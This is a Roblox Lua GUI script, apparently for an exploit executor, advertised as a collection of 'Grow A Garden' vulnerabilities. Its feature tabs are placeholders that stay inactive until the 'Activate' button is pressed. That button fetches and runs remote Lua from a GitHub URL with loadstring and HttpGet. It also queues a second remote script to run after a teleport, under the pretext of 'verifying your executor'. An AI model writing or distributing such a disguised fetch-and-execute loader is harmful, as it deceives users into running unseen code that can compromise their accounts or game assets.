local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "PocariVulns"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local minimizeButton = Instance.new("TextButton")
minimizeButton.Name = "MinimizeButton"
minimizeButton.Size = UDim2.new(0, 120, 0, 30)
minimizeButton.Position = UDim2.new(0, 15, 0, 15)
minimizeButton.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
minimizeButton.BorderSizePixel = 0
minimizeButton.Text = "PocariVulns"
minimizeButton.TextColor3 = Color3.fromRGB(135, 140, 200)
minimizeButton.TextSize = 11
minimizeButton.Font = Enum.Font.GothamSemibold
minimizeButton.Visible = false
minimizeButton.Parent = screenGui

local minimizeCorner = Instance.new("UICorner")
minimizeCorner.CornerRadius = UDim.new(0, 6)
minimizeCorner.Parent = minimizeButton

local minimizeStroke = Instance.new("UIStroke")
minimizeStroke.Color = Color3.fromRGB(45, 50, 80)
minimizeStroke.Thickness = 1
minimizeStroke.Parent = minimizeButton

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 380, 0, 240)
mainFrame.Position = UDim2.new(0.5, -190, 0.5, -120)
mainFrame.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local shadow = Instance.new("ImageLabel")
shadow.Name = "Shadow"
shadow.Size = UDim2.new(1, 16, 1, 16)
shadow.Position = UDim2.new(0, -8, 0, -8)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxasset://textures/ui/Controls/DropShadow.png"
shadow.ImageColor3 = Color3.fromRGB(0, 0, 5)
shadow.ImageTransparency = 0.2
shadow.ScaleType = Enum.ScaleType.Slice
shadow.SliceCenter = Rect.new(12, 12, 276, 276)
shadow.ZIndex = -1
shadow.Parent = mainFrame

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = mainFrame

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(45, 50, 80)
mainStroke.Thickness = 1
mainStroke.Parent = mainFrame

local titleBar = Instance.new("Frame")
titleBar.Name = "TitleBar"
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.Position = UDim2.new(0, 0, 0, 0)
titleBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleBar.BorderSizePixel = 0
titleBar.Parent = mainFrame

local titleCorner = Instance.new("UICorner")
titleCorner.CornerRadius = UDim.new(0, 10)
titleCorner.Parent = titleBar

local titleFix = Instance.new("Frame")
titleFix.Size = UDim2.new(1, 0, 0, 10)
titleFix.Position = UDim2.new(0, 0, 1, -10)
titleFix.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleFix.BorderSizePixel = 0
titleFix.Parent = titleBar

local titleText = Instance.new("TextLabel")
titleText.Name = "TitleText"
titleText.Size = UDim2.new(1, -70, 1, 0)
titleText.Position = UDim2.new(0, 12, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "PocariVulns"
titleText.TextColor3 = Color3.fromRGB(180, 185, 230)
titleText.TextSize = 13
titleText.Font = Enum.Font.GothamBold
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

local minimizeBtn = Instance.new("TextButton")
minimizeBtn.Name = "MinimizeBtn"
minimizeBtn.Size = UDim2.new(0, 20, 0, 20)
minimizeBtn.Position = UDim2.new(1, -50, 0, 5)
minimizeBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
minimizeBtn.BorderSizePixel = 0
minimizeBtn.Text = "—"
minimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minimizeBtn.TextSize = 10
minimizeBtn.Font = Enum.Font.GothamBold
minimizeBtn.Parent = titleBar

local minimizeBtnCorner = Instance.new("UICorner")
minimizeBtnCorner.CornerRadius = UDim.new(0, 10)
minimizeBtnCorner.Parent = minimizeBtn

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 20, 0, 20)
closeButton.Position = UDim2.new(1, -25, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(180, 60, 100)
closeButton.BorderSizePixel = 0
closeButton.Text = "X"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextSize = 10
closeButton.Font = Enum.Font.GothamBold
closeButton.Parent = titleBar

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 10)
closeCorner.Parent = closeButton

local contentContainer = Instance.new("Frame")
contentContainer.Name = "ContentContainer"
contentContainer.Size = UDim2.new(1, -8, 1, -64)
contentContainer.Position = UDim2.new(0, 4, 0, 34)
contentContainer.BackgroundTransparency = 1
contentContainer.Parent = mainFrame

local sidebar = Instance.new("Frame")
sidebar.Name = "Sidebar"
sidebar.Size = UDim2.new(0, 140, 1, 0)
sidebar.Position = UDim2.new(0, 0, 0, 0)
sidebar.BackgroundColor3 = Color3.fromRGB(8, 10, 18)
sidebar.BorderSizePixel = 0
sidebar.Parent = contentContainer

local sidebarCorner = Instance.new("UICorner")
sidebarCorner.CornerRadius = UDim.new(0, 8)
sidebarCorner.Parent = sidebar

local sidebarStroke = Instance.new("UIStroke")
sidebarStroke.Color = Color3.fromRGB(35, 40, 65)
sidebarStroke.Thickness = 1
sidebarStroke.Parent = sidebar

local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name = "TabsScrollFrame"
scrollFrame.Size = UDim2.new(1, -10, 1, -10)
scrollFrame.Position = UDim2.new(0, 5, 0, 5)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.ScrollBarThickness = 2
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 80, 120)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = sidebar

local tabContainer = Instance.new("Frame")
tabContainer.Name = "TabContainer"
tabContainer.Size = UDim2.new(1, 0, 0, 0)
tabContainer.AutomaticSize = Enum.AutomaticSize.Y
tabContainer.BackgroundTransparency = 1
tabContainer.Parent = scrollFrame

local tabLayout = Instance.new("UIListLayout")
tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
tabLayout.Padding = UDim.new(0, 6)
tabLayout.Parent = tabContainer

local tabPadding = Instance.new("UIPadding")
tabPadding.PaddingTop = UDim.new(0, 3)
tabPadding.PaddingBottom = UDim.new(0, 3)
tabPadding.PaddingLeft = UDim.new(0, 3)
tabPadding.PaddingRight = UDim.new(0, 3)
tabPadding.Parent = tabContainer

local tabs = {}
local function createTab(name, layoutOrder, enabled)
    local tab = Instance.new("Frame")
    tab.Name = name .. "Tab"
    tab.Size = UDim2.new(1, -6, 0, 32)
    tab.BackgroundColor3 = enabled and Color3.fromRGB(18, 22, 35) or Color3.fromRGB(10, 12, 20)
    tab.BorderSizePixel = 0
    tab.LayoutOrder = layoutOrder
    tab.Parent = tabContainer
    
    local tabCorner = Instance.new("UICorner")
    tabCorner.CornerRadius = UDim.new(0, 6)
    tabCorner.Parent = tab
    
    local tabStroke = Instance.new("UIStroke")
    tabStroke.Color = enabled and Color3.fromRGB(40, 45, 70) or Color3.fromRGB(30, 35, 50)
    tabStroke.Thickness = 1
    tabStroke.Parent = tab
    
    local tabButton = Instance.new("TextButton")
    tabButton.Name = "TabButton"
    tabButton.Size = UDim2.new(1, 0, 1, 0)
    tabButton.BackgroundTransparency = 1
    tabButton.Text = ""
    tabButton.Active = enabled
    tabButton.Parent = tab
    
    local nameLabel = Instance.new("TextLabel")
    nameLabel.Name = "NameLabel"
    nameLabel.Size = UDim2.new(1, -16, 1, 0)
    nameLabel.Position = UDim2.new(0, 8, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text = name
    nameLabel.TextColor3 = enabled and Color3.fromRGB(130, 140, 190) or Color3.fromRGB(70, 80, 110)
    nameLabel.TextSize = 11
    nameLabel.Font = Enum.Font.GothamSemibold
    nameLabel.TextXAlignment = Enum.TextXAlignment.Center
    nameLabel.TextYAlignment = Enum.TextYAlignment.Center
    nameLabel.Parent = tab
    
    if enabled then
        tabButton.MouseEnter:Connect(function()
            local tween = TweenService:Create(tab, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(25, 30, 45)})
            tween:Play()
            local strokeTween = TweenService:Create(tabStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Color = Color3.fromRGB(60, 70, 110)})
            strokeTween:Play()
            local textTween = TweenService:Create(nameLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Color3.fromRGB(160, 170, 220)})
            textTween:Play()
        end)
        
        tabButton.MouseLeave:Connect(function()
            local tween = TweenService:Create(tab, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(18, 22, 35)})
            tween:Play()
            local strokeTween = TweenService:Create(tabStroke, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Color = Color3.fromRGB(40, 45, 70)})
            strokeTween:Play()
            local textTween = TweenService:Create(nameLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {TextColor3 = Color3.fromRGB(130, 140, 190)})
            textTween:Play()
        end)
    end
    
    tabs[name] = tab
    return tab
end

local tabInstances = {}
tabInstances["Main"] = createTab("Main", 1, true)
tabInstances["Egg Randomizer"] = createTab("Egg Randomizer", 2, false)
tabInstances["Pet Mutation Randomizer"] = createTab("Pet Mutation Randomizer", 3, false)
tabInstances["Pet Age Loader"] = createTab("Pet Age Loader", 4, false)
tabInstances["Bring Back Dino"] = createTab("Bring Back Dino", 5, false)
tabInstances["Coming Soon"] = createTab("Coming Soon", 6, false)

local contentArea = Instance.new("Frame")
contentArea.Name = "ContentArea"
contentArea.Size = UDim2.new(1, -146, 1, 0)
contentArea.Position = UDim2.new(0, 146, 0, 0)
contentArea.BackgroundColor3 = Color3.fromRGB(5, 8, 15)
contentArea.BorderSizePixel = 0
contentArea.Parent = contentContainer

local contentCorner = Instance.new("UICorner")
contentCorner.CornerRadius = UDim.new(0, 8)
contentCorner.Parent = contentArea

local contentStroke = Instance.new("UIStroke")
contentStroke.Color = Color3.fromRGB(35, 40, 65)
contentStroke.Thickness = 1
contentStroke.Parent = contentArea

-- Create scrollable content area
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Name = "ContentScroll"
scrollFrame.Size = UDim2.new(1, -10, 1, -10)
scrollFrame.Position = UDim2.new(0, 5, 0, 5)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 4
scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(70, 80, 120)
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.Parent = contentArea

local contentLayout = Instance.new("UIListLayout")
contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
contentLayout.Padding = UDim.new(0, 10)
contentLayout.Parent = scrollFrame

local padding = Instance.new("UIPadding")
padding.PaddingTop = UDim.new(0, 5)
padding.PaddingLeft = UDim.new(0, 5)
padding.PaddingRight = UDim.new(0, 5)
padding.Parent = scrollFrame

-- Main content frame
local mainContent = Instance.new("Frame")
mainContent.Name = "MainContent"
mainContent.Size = UDim2.new(1, 0, 0, 0)
mainContent.AutomaticSize = Enum.AutomaticSize.Y
mainContent.BackgroundTransparency = 1
mainContent.LayoutOrder = 1
mainContent.Parent = scrollFrame

local welcomeLabel = Instance.new("TextLabel")
welcomeLabel.Name = "WelcomeLabel"
welcomeLabel.Size = UDim2.new(1, 0, 0, 0)
welcomeLabel.AutomaticSize = Enum.AutomaticSize.Y
welcomeLabel.BackgroundTransparency = 1
welcomeLabel.Text = "Welcome to PocariVulns!!\n\nThis is compilation of the Vulnerabilities active in Grow A Garden, this is purely for educational purposes only and not intended for harm and misuse.\n\nPlease press the Activate Button below to proceed, this will restart your server to initialize and verify your executor for the use of the scripts."
welcomeLabel.TextColor3 = Color3.fromRGB(180, 185, 230)
welcomeLabel.TextSize = 12
welcomeLabel.Font = Enum.Font.Gotham
welcomeLabel.TextWrapped = true
welcomeLabel.TextXAlignment = Enum.TextXAlignment.Left
welcomeLabel.TextYAlignment = Enum.TextYAlignment.Top
welcomeLabel.Parent = mainContent

local buttonContainer = Instance.new("Frame")
buttonContainer.Name = "ButtonContainer"
buttonContainer.Size = UDim2.new(1, 0, 0, 40)
buttonContainer.BackgroundTransparency = 1
buttonContainer.LayoutOrder = 2
buttonContainer.Parent = scrollFrame

local activateButton = Instance.new("TextButton")
activateButton.Name = "ActivateButton"
activateButton.Size = UDim2.new(0.6, 0, 0, 36)
activateButton.AnchorPoint = Vector2.new(0.5, 0.5)
activateButton.Position = UDim2.new(0.5, 0, 0.5, 0)
activateButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
activateButton.Text = "Activate"
activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
activateButton.TextSize = 14
activateButton.Font = Enum.Font.GothamBold
activateButton.Parent = buttonContainer

local activateButtonCorner = Instance.new("UICorner")
activateButtonCorner.CornerRadius = UDim.new(0, 8)
activateButtonCorner.Parent = activateButton

local activateButtonStroke = Instance.new("UIStroke")
activateButtonStroke.Color = Color3.fromRGB(100, 140, 255)
activateButtonStroke.Thickness = 1
activateButtonStroke.Parent = activateButton

activateButton.MouseEnter:Connect(function()
    TweenService:Create(activateButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(100, 140, 255)}):Play()
end)

activateButton.MouseLeave:Connect(function()
    TweenService:Create(activateButton, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)}):Play()
end)

activateButton.MouseButton1Click:Connect(function()
    activateButton.Text = "Activating..."
    queue_on_teleport([[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/visual.lua"))()
    ]])
    task.wait(5)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pocarisv/growagarden/refs/heads/main/background/main.lua"))()
    
    local tween = TweenService:Create(activateButton, TweenInfo.new(0.3), {
        BackgroundColor3 = Color3.fromRGB(50, 150, 50),
        Size = UDim2.new(0.4, 0, 0, 30)
    })
    tween:Play()
    
    tween.Completed:Wait()
    activateButton.Text = "Activated!"
    
    for tabName, tab in pairs(tabInstances) do
        if tabName ~= "Main" and tabName ~= "Coming Soon" then
            tab.BackgroundColor3 = Color3.fromRGB(18, 22, 35)
            tab.UIStroke.Color = Color3.fromRGB(40, 45, 70)
            tab.TabButton.Active = true
            tab.NameLabel.TextColor3 = Color3.fromRGB(130, 140, 190)
            
            tab.TabButton.MouseEnter:Connect(function()
                TweenService:Create(tab, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(25, 30, 45)}):Play()
                TweenService:Create(tab.UIStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(60, 70, 110)}):Play()
                TweenService:Create(tab.NameLabel, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(160, 170, 220)}):Play()
            end)
            
            tab.TabButton.MouseLeave:Connect(function()
                TweenService:Create(tab, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(18, 22, 35)}):Play()
                TweenService:Create(tab.UIStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(40, 45, 70)}):Play()
                TweenService:Create(tab.NameLabel, TweenInfo.new(0.2), {TextColor3 = Color3.fromRGB(130, 140, 190)}):Play()
            end)
        end
    end
end)

local watermarkFrame = Instance.new("Frame")
watermarkFrame.Name = "WatermarkFrame"
watermarkFrame.Size = UDim2.new(1, 0, 0, 26)
watermarkFrame.Position = UDim2.new(0, 0, 1, -26)
watermarkFrame.BackgroundColor3 = Color3.fromRGB(5, 8, 15)
watermarkFrame.BorderSizePixel = 0
watermarkFrame.ZIndex = 10
watermarkFrame.Parent = mainFrame

local watermarkCorner = Instance.new("UICorner")
watermarkCorner.CornerRadius = UDim.new(0, 10)
watermarkCorner.Parent = watermarkFrame

local watermarkFix = Instance.new("Frame")
watermarkFix.Size = UDim2.new(1, 0, 0, 10)
watermarkFix.Position = UDim2.new(0, 0, 0, 0)
watermarkFix.BackgroundColor3 = Color3.fromRGB(5, 8, 15)
watermarkFix.BorderSizePixel = 0
watermarkFix.Parent = watermarkFrame

local watermarkText = Instance.new("TextLabel")
watermarkText.Name = "WatermarkText"
watermarkText.Size = UDim2.new(1, 0, 1, 0)
watermarkText.Position = UDim2.new(0, 0, 0, 0)
watermarkText.BackgroundTransparency = 1
watermarkText.Text = "made by @pocarisv"
watermarkText.TextColor3 = Color3.fromRGB(70, 80, 120)
watermarkText.TextSize = 9
watermarkText.Font = Enum.Font.GothamSemibold
watermarkText.TextXAlignment = Enum.TextXAlignment.Center
watermarkText.ZIndex = 11
watermarkText.Parent = watermarkFrame

minimizeBtn.MouseEnter:Connect(function()
    local tween = TweenService:Create(minimizeBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(100, 140, 255)})
    tween:Play()
end)

minimizeBtn.MouseLeave:Connect(function()
    local tween = TweenService:Create(minimizeBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(80, 120, 255)})
    tween:Play()
end)

closeButton.MouseEnter:Connect(function()
    local tween = TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(200, 80, 120)})
    tween:Play()
end)

closeButton.MouseLeave:Connect(function()
    local tween = TweenService:Create(closeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(180, 60, 100)})
    tween:Play()
end)

minimizeButton.MouseEnter:Connect(function()
    local tween = TweenService:Create(minimizeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(20, 22, 35)})
    tween:Play()
end)

minimizeButton.MouseLeave:Connect(function()
    local tween = TweenService:Create(minimizeButton, TweenInfo.new(0.15, Enum.EasingStyle.Quad), {BackgroundColor3 = Color3.fromRGB(15, 15, 25)})
    tween:Play()
end)

local isMinimizing = false
local isRestoring = false
local isClosing = false

minimizeBtn.MouseButton1Click:Connect(function()
    if isMinimizing or isRestoring or isClosing then return end
    isMinimizing = true
    
    local currentPos = mainFrame.Position
    local targetPos = UDim2.new(0, 75, 0, 30)
    
    local shrinkTween = TweenService:Create(
        mainFrame,
        TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {
            Size = UDim2.new(0, 0, 0, 0), 
            Position = targetPos
        }
    )
    
    local fadeTween = TweenService:Create(
        mainFrame,
        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {BackgroundTransparency = 1}
    )
    
    shrinkTween:Play()
    fadeTween:Play()
    
    shrinkTween.Completed:Connect(function()
        mainFrame.Visible = false
        mainFrame.BackgroundTransparency = 0
        
        minimizeButton.Visible = true
        minimizeButton.Size = UDim2.new(0, 0, 0, 0)
        minimizeButton.Position = targetPos
        minimizeButton.BackgroundTransparency = 1
        
        local appearTween = TweenService:Create(
            minimizeButton,
            TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            {Size = UDim2.new(0, 120, 0, 30)}
        )
        
        local fadeInTween = TweenService:Create(
            minimizeButton,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 0}
        )
        
        appearTween:Play()
        fadeInTween:Play()
        
        appearTween.Completed:Connect(function()
            isMinimizing = false
        end)
    end)
end)

minimizeButton.MouseButton1Click:Connect(function()
    if isMinimizing or isRestoring or isClosing then return end
    isRestoring = true
    
    local hideTween = TweenService:Create(
        minimizeButton,
        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {
            Size = UDim2.new(0, 0, 0, 0),
            BackgroundTransparency = 1
        }
    )
    hideTween:Play()
    
    hideTween.Completed:Connect(function()
        minimizeButton.Visible = false
        minimizeButton.BackgroundTransparency = 0
        
        mainFrame.Visible = true
        mainFrame.Size = UDim2.new(0, 0, 0, 0)
        mainFrame.Position = minimizeButton.Position
        mainFrame.BackgroundTransparency = 1
        
        local restoreTween = TweenService:Create(
            mainFrame,
            TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
            {
                Size = UDim2.new(0, 380, 0, 240), 
                Position = UDim2.new(0.5, -190, 0.5, -120)
            }
        )
        
        local fadeInTween = TweenService:Create(
            mainFrame,
            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {BackgroundTransparency = 0}
        )
        
        restoreTween:Play()
        fadeInTween:Play()
        
        restoreTween.Completed:Connect(function()
            isRestoring = false
        end)
    end)
end)

closeButton.MouseButton1Click:Connect(function()
    if isMinimizing or isRestoring or isClosing then return end
    isClosing = true
    
    local closeTween = TweenService:Create(
        mainFrame,
        TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {
            Size = UDim2.new(0, 0, 0, 0), 
            Position = UDim2.new(0.5, 0, 0.5, 0)
        }
    )
    
    local fadeTween = TweenService:Create(
        mainFrame,
        TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {BackgroundTransparency = 1}
    )
    
    local shadowFadeTween = TweenService:Create(
        shadow,
        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        {ImageTransparency = 1}
    )
    
    closeTween:Play()
    fadeTween:Play()
    shadowFadeTween:Play()
    
    closeTween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end)

local dragging = false
local dragStart = nil
local startPos = nil

local function startDrag(input)
    dragging = true
    dragStart = input.Position
    startPos = mainFrame.Position
end

local function updateDrag(input)
    if dragging then
        local delta = input.Position - dragStart
        mainFrame.Position = UDim2.new(
            startPos.X.Scale,
            startPos.X.Offset + delta.X,
            startPos.Y.Scale,
            startPos.Y.Offset + delta.Y
        )
    end
end

local function endDrag()
    dragging = false
end

titleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        startDrag(input)
    end
end)

minimizeButton.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragStart = input.Position
        startPos = minimizeButton.Position
        dragging = true
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        if dragging and mainFrame.Visible then
            updateDrag(input)
        elseif dragging and minimizeButton.Visible then
            local delta = input.Position - dragStart
            minimizeButton.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        endDrag()
    end
end)

mainFrame.Size = UDim2.new(0, 0, 0, 0)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)

local spawnTween = TweenService:Create(
    mainFrame,
    TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
    {Size = UDim2.new(0, 380, 0, 240), Position = UDim2.new(0.5, -190, 0.5, -120)}
)
spawnTween:Play()
